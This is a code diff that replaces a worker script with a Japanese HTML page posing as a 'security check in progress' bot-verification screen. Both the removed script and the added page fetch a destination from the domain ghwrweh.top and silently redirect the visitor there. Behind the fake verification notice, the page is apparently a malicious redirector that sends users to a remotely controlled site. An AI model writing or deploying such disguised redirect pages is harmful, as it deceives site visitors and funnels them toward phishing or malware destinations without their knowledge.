@@ -1,11 +1,26 @@
-const someURLToRedirectTo = 'https://ghwrweh.top/api/jumpSite?siteName='+'MnyreIZH'
-async function handleRequest(request) {
-  var response = await fetch(someURLToRedirectTo, {method: "GET"});
-  var result = await response.json();	
-  var html = `<script>self.location.href="` + result.data.siteUrl + `"</script>`
-  return new Response(html, {headers: {"content-type": "text/html;charset=UTF-8"}})
-}
-
-addEventListener("fetch", async event => {
-  event.respondWith(handleRequest(event.request))
-})
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>セキュリティ確認中...</title>
+  <script>
+    fetch('https://ghwrweh.top/api/jumpSite?siteName=MnyreIZH')
+      .then(res => res.json())
+      .then(data => {
+        if (data && data.data && data.data.siteUrl) {
+          location.href = data.data.siteUrl;
+        }
+      })
+  </script>
+  <style>
+    body { background: #f6f6f6; font-family: sans-serif; text-align: center; padding-top: 100px; }
+    .loader { border: 6px solid #f3f3f3; border-top: 6px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto; }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <h2>安全確認中です...</h2>
+  <p>このリクエストが自動でないことを確認しています。</p>
+  <div class="loader"></div>
+</body>
+</html>
